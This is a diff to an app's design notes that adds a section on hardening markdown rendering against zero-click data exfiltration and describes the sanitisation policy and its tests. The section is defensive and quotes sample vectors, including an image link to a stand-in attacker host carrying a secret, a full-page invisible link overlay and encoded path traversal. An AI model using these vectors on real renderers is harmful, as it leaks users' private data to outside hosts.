@@ -2,7 +2,7 @@
 title: Document Spine
 status: shipped
 cycle: 59
-updated: 2026-08-26
+updated: 2026-10-20
 mymind_id: 541b04de-a9f9-4809-8001-50082fdafaa1
 mymind_hash: 25ac1bd347ce82384e96e94ac6180bc3ec0aeca1c523d866c8f0d4be3240a992
 ---
@@ -186,6 +186,73 @@ constructed the switch-during-debounce hazard rather than assuming it was safe. 
 in `autosave.test.ts` with a metadata-shaped payload, not just Editor.vue's string content. Public
 read-only page: `app/pages/share/[slug].vue` (`layout: false`).
 
+## Markdown rendering safety (cycle 88)
+Stored markdown can be attacker-influenced: documents ingested from mail, the web and captures,
+triage cards built from inbound email, agent-editable config, clipboard pastes. Rendering it is a
+**zero-click exfil channel**. An `![](https://attacker/?q=<secret>)`, a `style="background:url(…)"`,
+an iframe/embed/`<video poster>`, an `<a ping>` or a remote-collection icon all fire a request the
+moment the page renders. Provenance isn't tracked reliably, so **one policy covers all stored
+content**, including documents Tony wrote himself. Agent chat has had the same policy since 79b
+(`app/lib/agent/markdown-harden.ts`, `agentMarkdownProps`).
+
+**Where it applies.** All MDC rendering goes through `MdView.vue`: the documents preview,
+`MarkdownConfigEditor` (documents, profile, skills, jobs), triage cards (`/review`,
+`TriageAction.vue`), the public `/share/<slug>` page (also correct in its SSR HTML), and clipboard
+`bodyText`. `MdView` lets `<MDC>` parse and cache the content. Its default slot then renders
+`<MDCRenderer :body="hardenMdcBody(body, { origin })" :data="{}">`. Frontmatter is deliberately
+**not** passed to the renderer, because `mdc.components` in frontmatter can remap tags. Clipboard
+rich HTML (`MessageText.vue` `v-html`, and the `execCopyHtml` copy fallback in `useClipboard.ts`)
+goes through `hardenStoredHtml`, which applies the same policy on top of DOMPurify.
+
+**The policy** (`app/lib/markdown/stored-harden.ts`):
+- **Images** load only from same-origin `/api/images/…` or `/api/i/…` (relative, or absolute on the
+  app's own origin), `data:image/<raster>` or `blob:`. Any other image renders as a link,
+  `[Remote image: <alt>]` (`.mm-md-blocked-img`). Clicking it opens the image; nothing loads at
+  render.
+- **Tags**: plain markdown tags plus an explicit **component allowlist**, each with vetted props.
+  The allowed components are the Nuxt UI prose `callout`/`note`/`tip`/`warning`/`caution`, `card`,
+  `card-group`, `tabs`, `tabs-item`, `steps`, `accordion(-item)`, `badge`, `kbd`, `icon`,
+  `collapsible`, `code-group`, `code-collapse`, `code-preview`, `field(-group)`, and the app's
+  `mc-callout`.
+  - MDCRenderer resolves **any** globally registered component by tag name (`::u-button`, …), so
+    anything off the list is unwrapped to its text.
+  - `style`, `script`, `link`, `iframe`, `object`, `embed`, `svg`, `video`, `audio`, `source`,
+    `picture`, `meta`, `base`, `form`, … are dropped along with their content.
+- **Attributes**: no `on*`, `ping`, `srcset`, `poster`, `as`, or `:bound` props, and no `style`.
+  The two exceptions are table `text-align` and shiki's `--shiki-*: #hex` token variables.
+  `data-*`/`aria-*` are kept.
+  - `class` is an **allowlist, filtered per token** (`app/lib/markdown/safe-classes.ts`). Only
+    harmless typography, colour and spacing utilities survive. Positioning, z-index, inset,
+    opacity, transform, pointer-events and size-forcing utilities are removed, with or without a
+    variant prefix and including arbitrary values. Without this, a `{.fixed .inset-0 .opacity-0}`
+    link would turn every click on the page into a click on the attacker's URL.
+  - The same class rule applies to clipboard HTML and to agent chat.
+  - Element `id`s get a `user-content-` prefix (MDC, chat and clipboard, via DOMPurify
+    `SANITIZE_NAMED_PROPS`), and in-document `#fragment` links are re-pointed to match. An external
+    deep link to a shared page's heading therefore needs `#user-content-<id>`.
+- **Icons** (`icon`/`name` props) must come from the **locally bundled** collections, `lucide` and
+  `simple-icons` (`LOCAL_ICON_COLLECTIONS`). Before cycle 88, @nuxt/icon ran with `fallbackToApi`
+  on, so any other collection made `/api/_nuxt_icon/<collection>.json` fetch `api.iconify.design`
+  with an attacker-chosen name. That was verified, including a bypass: a code fence with a filename
+  makes Nuxt UI build an `i-vscode-icons-file-type-<ext>` name.
+  - `fallbackToApi` is now **off app-wide** (nuxt.config), so no icon name can reach the network.
+  - Code fences with a filename use the local `i-lucide-file-code`.
+- **Image paths** are checked after decoding and URL normalisation, so `%2e%2e` traversal can't pass
+  the same-origin test. The agent image check gets the same fix.
+- **Clipboard "Copy"** of a rich paste copies remote images as links, a consequence of the policy.
+- **Links** stay clickable and always carry `rel="noopener noreferrer"` (plus `target=_blank` when
+  external). Only http(s), mailto, tel, relative and fragment hrefs (and component `to`) survive.
+- **Shiki**: the highlighter's injected `<style>` block is dropped like every other `<style>`, so
+  `MdView.vue` carries its fixed light/default/dark theme rules, copied from
+  `@nuxtjs/mdc/dist/runtime/highlighter/shiki.js`.
+
+**Tests**: `app/lib/markdown/stored-harden.test.ts` mounts the real `MdView`, `MDC` and
+`MDCRenderer` chain (the vitest config compiles `.vue` via `@vitejs/plugin-vue`) against the shared
+vector list in `app/lib/markdown/exfil-vectors.fixture.ts`. It uses an oracle that is independent
+of the code under test. It also includes not-vacuous checks against the pre-88 path.
+
+**Follow-up**: there is no app-wide CSP `img-src`/`style-src` backstop yet.
+
 ## Search
 **Hybrid (cycle 2, vector lane moved in cycle 31):** `searchDocs`/`searchDocIds` fuse a trigram
 lane (`ilike` + `similarity()` directly on `documents.title`/`content`) and a vector cosine lane
@@ -219,7 +286,7 @@ via RRF, falling back to trigram-only if embeddings are unavailable. **The vecto
   low-latency via `useSortable`'s own DOM splice).
   Copy-public-link (full URL).
 - **Markdown toolbar** (`MarkdownToolbar.vue`, `.md` + edit/split only): bold/italic/code/H1–3/list/numbered/checkbox/quote/link/codeblock via pure `shared/utils/md-transforms.ts`, applied through `CodeEditor.client.vue`'s exposed `getSelection`/`applyTransform`/`insertText`. Insert menu for MDC block components.
-- **Custom MDC components** (`app/components/content/`): `Note`, `Collapsible` (and `Callout` — though `::callout` currently resolves to MDC's built-in themed prose-callout; see handover).
+- **Custom MDC components** (`app/components/content/`): `Note`, `Collapsible`, `McCallout` (`::callout` resolves to Nuxt UI's themed prose callout). Only allowlisted components render — see [Markdown rendering safety](#markdown-rendering-safety-cycle-88).
 - **Inline image paste/drop** in the markdown editor → public upload (`/api/upload?public=1`) → `![](url)` at the cursor.
 - **Last-open doc** persisted via `useCookie('mm.lastDoc')` (`?doc=` query wins).
 - **New-document modal** (`NewDocumentModal.vue`) offers a `USelectMenu` folder picker over every
